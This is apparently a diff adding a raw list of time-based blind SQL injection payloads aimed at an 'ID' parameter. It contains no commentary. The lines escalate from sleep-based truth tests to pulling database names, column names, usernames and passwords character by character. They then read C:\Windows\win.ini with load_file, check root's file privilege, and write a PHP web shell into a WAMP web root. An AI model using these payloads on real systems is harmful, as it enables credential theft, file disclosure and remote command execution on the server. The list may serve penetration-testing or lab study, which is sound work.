@@ -1,0 +1,38 @@
+ID:1' -- 
+ID:1' -- 
+ID:1' AND SLEEP(3)-- 
+ID:1' AND IF (1=1) THEN SLEEP(3)-- 
+ID:1' AND IF (1=1) THEN SLEEP(3)-- 
+ID:1' AND IF (1=2) THEN SLEEP(3)-- 
+ID:1' AND IF (1=1) THEN SLEEP(5)-- 
+ID:1' AND IF (1=1) THEN SLEEP(5)-- 
+ID:1' AND IF (1=1) THEN SLEEP(5) END IF-- 
+ID:1' AND IF (1=1,SLEEP(5),'a')-- 
+ID:1' AND IF (1=2,SLEEP(5),'a')-- 
+ID:1' AND IF (length(database()=8,SLEEP(5),'a')-- 
+ID:1' AND IF (length(database())=8,SLEEP(5),'a')-- 
+ID:1' -- 
+ID:1' -- 
+ID:1' AND IF (length(database())=8,SLEEP(5),'a')-- 
+ID:1' AND IF (substring(database())='s',SLEEP(5),'a')-- 
+ID:1' AND IF (substring(database(),1,1)='s',SLEEP(5),'a')-- 
+ID:1' AND IF (substring(select group_concat(column_names) from information_schema.columns where table_name='users',1,1)='s',SLEEP(5),'a')-- 
+ID:1' AND IF (substring((select group_concat(column_names) from information_schema.columns where table_name='users'),1,1)='s',SLEEP(5),'a')-- 
+ID:1' AND IF (substring((select group_concat(column_name) from information_schema.columns where table_name='users'),1,1)='s',SLEEP(5),'a')-- 
+ID:1' AND IF (substring((select group_concat(column_name) from information_schema.columns where table_name='users'),1,1)='i',SLEEP(5),'a')-- 
+ID:1' AND IF (substring((select username from users where id='1'),1,1)='D',SLEEP(5),'a')-- 
+ID:1' AND IF (substring((select password from users where id='1'),1,1)='D',SLEEP(5),'a')-- 
+ID:1' AND IF (substring((select password from users where id='1'),1,1)='D',SLEEP(5),'a')-- 
+ID:1' and if (substring(load_file('C:\\\\Windows\\\\win.ini'),1,1)='f',sleep(5),'a')-- 
+ID:1' and if (substring(load_file('C:\\\\Windows\\\\win.ini'),1,1)='f',sleep(5),'a')-- 
+ID:1' and if (substring(load_file('C:\\\\Windows\\\\win.ini'),1,1)=';',sleep(5),'a')-- 
+ID:1' and if (substring(load_file('C:\\\\Windows\\\\win.ini'),1,1)='',sleep(5),';')-- 
+ID:1' and if (substring(load_file('C:\\\\Windows\\\\win.ini'),1,1)=';',sleep(5),';')-- 
+ID:1' UNION select "<?php system($_GET['cmd']); ?>",1,1 into outfile 'C:/wamp64/www/shell.php'-- 
+ID:1' UNION select "<?php system($_GET['cmd']); ?>",1,1 into outfile 'C:/wamp64/www/shell.php'-- 
+ID:1' AND IF(SUBSTRING(version(),1,1)='r',SLEEP(4),1)-- 
+ID:1' AND IF(SUBSTRING((select user()),1,1)='r',SLEEP(4),1)-- 
+ID:1' AND IF((select file_priv from mysql.user where user='root')='Y',SLEEP(4),1)-- 
+ID:1' AND IF((select file_priv from mysql.user where user='root')='Y',SLEEP(4),1)-- 
+ID:1' AND IF((select file_priv from mysql.user where user='root' limit 0,1)='Y',SLEEP(4),1)-- 
+ID:1' AND IF((select file_priv from mysql.user where user='root' limit 0,1)='Y',SLEEP(4),1)-- 
